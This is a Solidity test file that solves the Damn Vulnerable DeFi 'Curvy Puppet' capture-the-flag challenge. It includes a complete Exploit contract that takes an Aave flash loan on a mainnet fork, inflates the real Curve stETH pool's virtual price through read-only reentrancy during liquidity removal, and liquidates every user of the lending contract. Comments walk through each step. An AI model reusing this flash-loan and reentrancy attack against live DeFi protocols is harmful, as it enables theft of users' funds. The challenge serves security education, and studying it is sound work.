// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);
            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {

        // @note The solution to this challenge is pretty straighforward. One needs to manipulate the _getLPTokenPrice to such extent that users collateral becomes at risk. in order for this to happen, curve's get_virtual_price must return a value >= 3,6. 
        // Now the hard part is the implementation. To be able to influence the rate to such extent we need a huge amount of liquidity, especially in stETH. By Huge I meant > 120_000e18. There are few options here and I believe few solutions can work. The only protocol that offers such high liquidity with very low fees is aave3. This allows us to take a flashLoan and hack the protocol in one shot. While technically you can use many protocols and gets multiple flashloans.


        address[] memory borrowers = new address[](3);
        borrowers[0] = alice;
        borrowers[1] = bob;
        borrowers[2] = charlie;

        // Recover the player's funds. This will allow us to repay the fees of the flashloan.

        weth.transferFrom(treasury, player, TREASURY_WETH_BALANCE);
        weth.withdraw(TREASURY_WETH_BALANCE);

        // Create the exploit and execute the logic
        // //@note 5 steps to this exploit :
        // 1. Take the flashloan
        // 2. Manipulate the price in curve
        // 3. Liquidate the users in CurvyPuppet
        // 4. Repay the flashloan
        // 5. Recover the funds to treasury
        Exploit exploit = new Exploit{value : player.balance}(curvePool, lending, permit2, dvt, stETH, weth, borrowers);
        exploit.recoverFunds(treasury);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}


contract Exploit {

    IStableSwap internal immutable curvePool;
    CurvyPuppetLending internal immutable lending;
    IPermit2 internal immutable permit2;
    DamnValuableToken internal immutable dvt;
    IERC20 internal immutable stETH;
    WETH internal immutable weth;
    // IBalancerVault internal constant Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWSTETH internal constant wstETH = IWSTETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IAaveFlashloan aave = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    address internal immutable player;
    address[] internal to_liquidate;
    uint256 internal nonce;

    constructor(IStableSwap _curvePool, CurvyPuppetLending _lending, IPermit2 _permit2, DamnValuableToken _dvt, IERC20 _stETH , WETH _weth, address[] memory borrowers) payable {
        curvePool = _curvePool;
        lending = _lending;
        permit2 = _permit2;
        dvt = _dvt;
        stETH = _stETH;
        weth = _weth;
        to_liquidate = borrowers;
        player = msg.sender;
    }

    function remove_Liquidity() internal {
        stETH.approve(address(curvePool), type(uint256).max);
        uint256 stETHBal = stETH.balanceOf(address(this));
        // We add massive amount of liquidity
        curvePool.add_liquidity([uint256(0), stETHBal], 0);
        nonce+=1;
        IERC20(curvePool.lp_token()).approve(address(curvePool), type(uint256).max);
        // @note We then remove all of it at once and specifying 1 wei in eth, this should trigger our receive function and massively increase the virtual rate because :
        // @note In curve the lp is burned FIRST, then the wei is first sent which triggers the receives and allows us to do a read-only reentrancy of the get_virtual_price
        // Since it's price hasn't been adjusted yet
        curvePool.remove_liquidity_imbalance([uint256(1), 161_600e18], IERC20(curvePool.lp_token()).balanceOf(address(this)));

        // @note Now we burn any remaining LP tokens, because curve will send us ETH native it will execute receive() again. But this time we don't execute any logic
        nonce+=1;
        curvePool.remove_liquidity(IERC20(curvePool.lp_token()).balanceOf(address(this)), [uint256(0), 0]);

        assert(IERC20(curvePool.lp_token()).balanceOf(address(this)) == 0);

    }
    receive() payable external {
        if(nonce == 1){

        assert(curvePool.get_virtual_price() > 3.6e18);

        // Use the remaining LP tokens to liquidate the users

        // Need to double approve due to permit2 logic
        IERC20(curvePool.lp_token()).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: curvePool.lp_token(),
            spender: address(lending),
            amount: type(uint160).max,
            expiration: uint48(block.timestamp)
        });

        for(uint256 i = 0; i < to_liquidate.length; i++){
        lending.liquidate(to_liquidate[i]);
        }
    }

    }

    function recoverFunds(
        address treasury
    ) external {

        // Execute a flashLoan from aave for 138_000e18 wsteETH
        address[] memory assets = new address[](1);
        assets[0] = address(wstETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 138_000 * 1e18;
        uint256[] memory interestRateModes = new uint256[](2);
        interestRateModes[0] = 0;
        interestRateModes[1] = 0;
        // This will execute executeOperation
        aave.flashLoan(address(this), assets, amounts, interestRateModes, address(this), bytes(""), 0);

        // @note Repayement is done. Now any recovered token is sent to treasury to pass the chanllenge
        weth.deposit{value: address(this).balance}();

        weth.transfer(treasury, weth.balanceOf(address(this)));
        dvt.transfer(treasury, dvt.balanceOf(address(this)));


    }
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {

        // Unwrap all wstETH into steth
        wstETH.unwrap(wstETH.balanceOf(address(this)));

        // Execute the hack logic
        remove_Liquidity();

        // @note Now time to repay the flashLoan

        uint256 stETHBal = stETH.balanceOf(address(this));

        // We need a bit more wstETH than loaned at first because of fees and slippage during liquidity removal in curve. So we submit eth into steth and wrap it
        address(stETH).call{value : 95e18}(abi.encodeWithSignature("submit(address)", address(0)));
        stETH.approve(address(wstETH), stETH.balanceOf(address(this)));
        wstETH.wrap(stETH.balanceOf(address(this)));

        // Calculate the exact amount that we need to repay and approve aave. transferfrom is executed in aave
        uint256 wstETHAmountToPay = amounts[0] + (amounts[0] * 5 / 1e4) + 1; 
        wstETH.approve(address(aave), wstETHAmountToPay);

        return true;
    }
}

interface IWSTETH is IERC20 {
    function wrap(uint256 _stETHAmount) external returns (uint256);
    function unwrap(uint256 _wstETHAmount) external returns (uint256);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;

    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;

    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;

    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;

    function repay(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        address onBehalfOf
    ) external returns (uint256);

    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}
